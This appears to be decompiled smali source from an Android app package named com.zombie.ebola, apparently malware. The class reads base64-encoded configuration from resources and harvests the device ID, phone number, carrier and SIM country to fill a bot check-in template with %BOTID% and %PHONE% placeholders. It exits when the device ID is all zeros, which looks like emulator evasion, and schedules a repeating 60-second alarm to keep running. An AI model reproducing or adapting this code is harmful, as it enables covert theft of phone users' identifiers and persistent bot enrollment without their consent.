.class public Lcom/zombie/ebola/k;
.super Landroid/os/AsyncTask;


# instance fields
.field a:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method

.method private a(Landroid/content/Context;)Ljava/lang/String;
    .locals 1

    invoke-virtual {p1}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/res/Resources;->getConfiguration()Landroid/content/res/Configuration;

    move-result-object v0

    iget-object v0, v0, Landroid/content/res/Configuration;->locale:Ljava/util/Locale;

    invoke-virtual {v0}, Ljava/util/Locale;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private a(Landroid/telephony/TelephonyManager;)Ljava/lang/String;
    .locals 1

    invoke-virtual {p1}, Landroid/telephony/TelephonyManager;->getSimCountryIso()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private a(Landroid/app/AlarmManager;Landroid/app/PendingIntent;)V
    .locals 7

    const/4 v1, 0x0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    const-wide/32 v4, 0xea60

    move-object v0, p1

    move-object v6, p2

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    return-void
.end method

.method private a(Ljava/lang/String;)[Ljava/lang/String;
    .locals 1

    const-string v0, ";"

    invoke-virtual {p1, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private b(Landroid/telephony/TelephonyManager;)Ljava/lang/String;
    .locals 1

    invoke-virtual {p1}, Landroid/telephony/TelephonyManager;->getSimOperator()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private c(Landroid/telephony/TelephonyManager;)Ljava/lang/String;
    .locals 1

    invoke-virtual {p1}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private d(Landroid/telephony/TelephonyManager;)Ljava/lang/String;
    .locals 1

    invoke-virtual {p1}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method


# virtual methods
.method protected varargs a([Landroid/content/Context;)Ljava/lang/Void;
    .locals 10

    const/4 v2, 0x0

    const/4 v9, 0x1

    const/4 v3, 0x0

    aget-object v0, p1, v3

    iput-object v0, p0, Lcom/zombie/ebola/k;->a:Landroid/content/Context;

    new-instance v0, Lcom/zombie/ebola/t;

    invoke-direct {v0}, Lcom/zombie/ebola/t;-><init>()V

    const-string v1, "jorack"

    const-string v4, "0_cfg"

    aget-object v5, p1, v3

    invoke-virtual {v0, v1, v4, v5}, Lcom/zombie/ebola/t;->a(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_7

    const/4 v0, 0x0

    :try_start_0
    aget-object v0, p1, v0

    const v1, 0x7f060001

    invoke-virtual {v0, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v0, v1}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v1

    new-instance v0, Ljava/lang/String;

    const-string v4, "UTF-8"

    invoke-direct {v0, v1, v4}, Ljava/lang/String;-><init>([BLjava/lang/String;)V
    :try_end_0
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_1

    move-object v4, v0

    :goto_0
    const/4 v0, 0x0

    :try_start_1
    aget-object v0, p1, v0

    const v1, 0x7f060002

    invoke-virtual {v0, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v0, v1}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v1

    new-instance v0, Ljava/lang/String;

    const-string v5, "UTF-8"

    invoke-direct {v0, v1, v5}, Ljava/lang/String;-><init>([BLjava/lang/String;)V
    :try_end_1
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_1 .. :try_end_1} :catch_2
    .catch Ljava/lang/IllegalArgumentException; {:try_start_1 .. :try_end_1} :catch_3

    move-object v1, v0

    :goto_1
    invoke-direct {p0, v4}, Lcom/zombie/ebola/k;->a(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v4

    move v0, v3

    :goto_2
    array-length v5, v4

    if-lt v0, v5, :cond_2

    aget-object v0, p1, v3

    const-string v4, "phone"

    invoke-virtual {v0, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v4

    if-eqz v4, :cond_3

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v4

    :goto_3
    invoke-direct {p0, v0}, Lcom/zombie/ebola/k;->d(Landroid/telephony/TelephonyManager;)Ljava/lang/String;

    move-result-object v5

    if-eqz v5, :cond_4

    invoke-direct {p0, v0}, Lcom/zombie/ebola/k;->d(Landroid/telephony/TelephonyManager;)Ljava/lang/String;

    move-result-object v5

    :goto_4
    invoke-direct {p0, v0}, Lcom/zombie/ebola/k;->c(Landroid/telephony/TelephonyManager;)Ljava/lang/String;

    move-result-object v6

    if-eqz v6, :cond_5

    invoke-direct {p0, v0}, Lcom/zombie/ebola/k;->c(Landroid/telephony/TelephonyManager;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v6

    if-le v6, v9, :cond_5

    invoke-direct {p0, v0}, Lcom/zombie/ebola/k;->b(Landroid/telephony/TelephonyManager;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v6

    if-le v6, v9, :cond_5

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v6

    :goto_5
    invoke-direct {p0, v0}, Lcom/zombie/ebola/k;->a(Landroid/telephony/TelephonyManager;)Ljava/lang/String;

    move-result-object v7

    if-eqz v7, :cond_6

    invoke-direct {p0, v0}, Lcom/zombie/ebola/k;->a(Landroid/telephony/TelephonyManager;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v7

    if-le v7, v9, :cond_6

    invoke-direct {p0, v0}, Lcom/zombie/ebola/k;->a(Landroid/telephony/TelephonyManager;)Ljava/lang/String;

    move-result-object v0

    :goto_6
    sget-object v7, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    const-string v8, "_"

    invoke-virtual {v0, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v8

    if-eqz v8, :cond_0

    const-string v8, "_"

    invoke-virtual {v0, v8}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    aget-object v0, v0, v9

    :cond_0
    const-string v8, "000000000000000"

    invoke-virtual {v4, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v8

    if-eqz v8, :cond_1

    invoke-static {v3}, Ljava/lang/System;->exit(I)V

    :cond_1
    const-string v8, "%BOTID%"

    invoke-virtual {v1, v8, v4}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    const-string v4, "%NETWORK%"

    const-string v8, "&"

    const-string v9, "_"

    invoke-virtual {v6, v8, v9}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    const-string v8, " "

    const-string v9, "_"

    invoke-virtual {v6, v8, v9}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v4, v6}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    const-string v4, "%LOC%"

    invoke-virtual {v1, v4, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "%PHONE%"

    invoke-virtual {v0, v1, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "%BOTVER%"

    new-instance v4, Lcom/zombie/ebola/t;

    invoke-direct {v4}, Lcom/zombie/ebola/t;-><init>()V

    const-string v5, "jorack"

    const-string v6, "3_cfg"

    aget-object v8, p1, v3

    invoke-virtual {v4, v5, v6, v8}, Lcom/zombie/ebola/t;->a(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v1, v4}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "%SDK%"

    invoke-virtual {v0, v1, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "%PREF%"

    new-instance v4, Lcom/zombie/ebola/t;

    invoke-direct {v4}, Lcom/zombie/ebola/t;-><init>()V

    const-string v5, "jorack"

    const-string v6, "1_cfg"

    aget-object v7, p1, v3

    invoke-virtual {v4, v5, v6, v7}, Lcom/zombie/ebola/t;->a(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v1, v4}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v1, " "

    const-string v4, "_"

    invoke-virtual {v0, v1, v4}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Lcom/zombie/ebola/t;

    invoke-direct {v1}, Lcom/zombie/ebola/t;-><init>()V

    const-string v4, "jorack"

    const-string v5, "init"

    aget-object v6, p1, v3

    invoke-virtual {v1, v4, v5, v0, v6}, Lcom/zombie/ebola/t;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    const-string v0, "joracker"

    new-instance v1, Lcom/zombie/ebola/t;

    invoke-direct {v1}, Lcom/zombie/ebola/t;-><init>()V

    const-string v4, "jorack"

    const-string v5, "0_cfg"

    aget-object v3, p1, v3

    invoke-virtual {v1, v4, v5, v3}, Lcom/zombie/ebola/t;->a(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {p0}, Lcom/zombie/ebola/k;->a()V

    :goto_7
    return-object v2

    :catch_0
    move-exception v0

    move-object v4, v2

    goto/16 :goto_0

    :catch_1
    move-exception v0

    move-object v4, v2

    goto/16 :goto_0

    :catch_2
    move-exception v0

    move-object v1, v2

    goto/16 :goto_1

    :catch_3
    move-exception v0

    move-object v1, v2

    goto/16 :goto_1

    :cond_2
    aget-object v5, p1, v3

    const-string v6, "jorack"

    invoke-virtual {v5, v6, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v5

    invoke-interface {v5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v7, "_cfg"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    aget-object v7, v4, v0

    invoke-interface {v5, v6, v7}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v5}, Landroid/content/SharedPreferences$Editor;->commit()Z

    add-int/lit8 v0, v0, 0x1

    goto/16 :goto_2

    :cond_3
    aget-object v4, p1, v3

    invoke-virtual {v4}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    const-string v5, "android_id"

    invoke-static {v4, v5}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    goto/16 :goto_3

    :cond_4
    const-string v5, ""

    goto/16 :goto_4

    :cond_5
    const-string v6, ""

    goto/16 :goto_5

    :cond_6
    aget-object v0, p1, v3

    invoke-direct {p0, v0}, Lcom/zombie/ebola/k;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    goto/16 :goto_6

    :cond_7
    invoke-virtual {p0}, Lcom/zombie/ebola/k;->a()V

    goto :goto_7
.end method

.method public a()V
    .locals 5

    const/4 v4, 0x0

    iget-object v0, p0, Lcom/zombie/ebola/k;->a:Landroid/content/Context;

    const-string v1, "alarm"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lcom/zombie/ebola/k;->a:Landroid/content/Context;

    const-class v3, Lcom/zombie/ebola/mimi;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iget-object v2, p0, Lcom/zombie/ebola/k;->a:Landroid/content/Context;

    invoke-static {v2, v4, v1, v4}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    invoke-direct {p0, v0, v1}, Lcom/zombie/ebola/k;->a(Landroid/app/AlarmManager;Landroid/app/PendingIntent;)V

    return-void
.end method

.method protected varargs synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    check-cast p1, [Landroid/content/Context;

    invoke-virtual {p0, p1}, Lcom/zombie/ebola/k;->a([Landroid/content/Context;)Ljava/lang/Void;

    move-result-object v0

    return-object v0
.end method
